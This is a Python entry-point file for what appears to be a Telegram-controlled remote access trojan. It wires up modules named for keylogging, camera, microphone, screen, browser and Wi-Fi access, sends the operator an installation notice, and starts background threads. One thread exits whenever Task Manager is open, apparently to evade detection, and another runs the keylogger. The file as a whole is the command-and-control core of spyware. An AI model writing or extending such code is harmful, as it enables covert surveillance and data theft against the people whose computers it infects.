from telebot.async_telebot import AsyncTeleBot
import asyncio
import threading
import constants
import tools
from command_registry import registry
from callback_system import callback_system
from modules import About, Admin, Browser, Camera, Command, Configuration, Crypt, Delete, \
    Environment, Exit, File, Keyboard, Keylogger, Log, Menu, \
    Microphone, Mouse, System, NetworkDrive, Parser, Permissions, Photo, Restart, Screen, \
    TaskManager, Updater, WIFI

bot = AsyncTeleBot(Parser.get_token())


@bot.callback_query_handler(func=lambda call: True)
async def callback_query(call):

    callback = call.data

    if callback.split(':')[0] == constants.MANAGEPERMISSION_prefix:
        await Admin.registerpermission_callback(bot, call)

        await bot.answer_callback_query(call.id)
    else:
        await callback_system.handle_callback(bot, call)


async def run_bot():
    registry.apply_to_bot(bot, tools)

    callback_system.initialize()
    callback_system.set_bot_and_tools(bot, tools)

    asyncio.create_task(Menu.installation_notification(bot))

    await bot.polling(none_stop=True)


def init_background_tasks():
    try:
        tasks = [TaskManager.exit_if_task_manager,
                 Configuration.auto_update, Log.auto_update]

        if Keylogger.get_status():
            tasks.append(Keylogger.start)

        for task in tasks:
            threading.Thread(target=task, daemon=True).start()

    except Exception as ex:
        pass


def main():
    Environment.clean_tmp_dir()

    init_background_tasks()

    asyncio.run(run_bot())


if __name__ == '__main__':
    main()
